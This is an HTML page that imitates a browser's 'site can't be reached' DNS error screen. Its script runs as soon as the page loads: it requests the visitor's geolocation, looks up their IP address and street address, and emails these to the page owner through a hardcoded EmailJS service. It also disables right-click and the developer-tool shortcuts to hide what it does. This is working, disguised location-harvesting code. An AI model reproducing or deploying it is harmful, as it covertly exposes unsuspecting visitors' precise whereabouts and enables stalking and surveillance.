<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
        rel="stylesheet">
    <style>
        body {
            font-family: "Roboto", sans-serif;
            margin: 0px auto;
            padding: 0px;
            font-size: 1rem;
            background-color: rgb(43, 44, 46);
            color: rgb(181, 184, 188);
            height: 100vh;
            position: relative;
        }
    </style>
</head>

<body>
    <input type="hidden" id="latitude">
    <input type="hidden" id="longitude">
    <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
        <img style="width: 72px; height: 72px; margin-bottom: 10px;"
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJAAAACQAQMAAADdiHD7AAAABlBMVEUAAABTU1OoaSf/AAAAAXRSTlMAQObYZgAAAFJJREFUeF7t0cENgDAMQ9FwYgxG6WjpaIzCCAxQxVggFuDiCvlLOeRdHR9yzjncHVoq3npu+wQUrUuJHylSTmBaespJyJQoObUeyxDQb3bEm5Au81c0pSCD8HYAAAAASUVORK5CYII=">
        <h1 style="font-size: 1.5rem; margin: 0px;">This site canâ€™t be reached</h1>
        <br>
        <p style="margin: 0px; font-size: .95rem;">Check if there is a typo in <span id="link"></span>.</p>
        <div style="margin-top: 12px; font-size: 0.8rem;">DNS_PROBE_FINISHED_NXDOMAIN</div>
        <button
            style="padding: 10px; border-radius: 50px; margin-top: 20px; background-color: rgb(78, 122, 193); border: none; cursor: pointer;"
            id="navigateButton">Reload</button>
    </div>
    <!-- <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script> -->
    <script>
        document.getElementById('navigateButton').addEventListener('click', function () {
            window.location.href = 'https://www.google.co.in/';
        })
        var locationlink = window.location.href;
        document.getElementById("link").innerHTML = locationlink;
        document.addEventListener('contextmenu', function (e) {
            e.preventDefault();
        });

        // Disable F12 key and Ctrl+Shift+I (to open developer tools)
        document.addEventListener('keydown', function (e) {
            // Disable F12 key
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.shiftKey && e.key === 'i') || (e.ctrlKey && e.shiftKey && e.key === 'C') || (e.ctrlKey && e.shiftKey && e.key === 'C')) {
                e.preventDefault();
            }
            // Disable Ctrl + U (View Page Source)
            if ((e.ctrlKey && e.key === 'U') || (e.ctrlKey && e.key === 'u')) {
                e.preventDefault();
            }
        });
        (function () {
            emailjs.init("MPhPUQIdgkUqoKusv");
        })();

        async function getIP() {
            try {
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error fetching IP address:", error);
                return "Unknown IP";
            }
        }

        async function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    showPosition(position);
                    const ipAddress = await getIP();
                    const locationData = await fetchLocationData(position.coords.latitude, position.coords.longitude);
                    sendEmail(position, ipAddress, locationData);
                }, (error) => {
                    console.error("Geolocation error:", error);
                });
            } else {
                console.log("Geolocation is not supported by this browser.")
            }
        }

        function showPosition(position) {
            document.getElementById("latitude").value = position.coords.latitude;
            document.getElementById("longitude").value = position.coords.longitude;
        }

        async function fetchLocationData(latitude, longitude) {
            const apiUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
            try {
                const response = await fetch(apiUrl);
                const data = await response.json();

                if (data && data.address) {
                    return {
                        country: data.address.country || "Unknown",
                        state: data.address.state || "Unknown",
                        city: data.address.city || data.address.town || data.address.village || "Unknown",
                        pincode: data.address.postcode || "Unknown",
                        display_name: data.display_name || "Unknown",
                        name: data.address.neighbourhood || data.address.suburb || "Unknown"
                    };
                } else {
                    console.log("location not found")
                    return {};
                }
            } catch (error) {
                console.error("Error fetching location details:", error);
                return {};
            }
        }

        function sendEmail(position, ipAddress, data) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            emailjs.send("service_mupmc8l", "template_1f01srj", {
                user_latitude: latitude,
                user_longitude: longitude,
                user_ipaddress: ipAddress,
                user_country: data.country,
                user_state: data.state,
                user_city: data.city,
                user_pincode: data.pincode,
                user_address: data.display_name,
                user_nearplace: data.name
            })
                .then(response => {
                }, error => {
                    console.log("Failed to send email.", error);
                });
        }

        async function showLocation() {
            const latitude = document.getElementById("latitude").value.trim();
            const longitude = document.getElementById("longitude").value.trim();

            // Validate that both latitude and longitude are provided and are numbers
            if (latitude && longitude && !isNaN(latitude) && !isNaN(longitude)) {
                const ipAddress = await getIP(); // Get the IP address
                const locationData = await fetchLocationData(latitude, longitude); // Fetch location data
                // Create a fake position object to match the expected format in sendEmail
                const position = {
                    coords: {
                        latitude: parseFloat(latitude),
                        longitude: parseFloat(longitude)
                    }
                };
                sendEmail(position, ipAddress, locationData); // Send the email
            } else {
                console.log("Please enter valid numeric values for latitude and longitude.")
            }
        }
        getLocation()
    </script>

</body>

</html>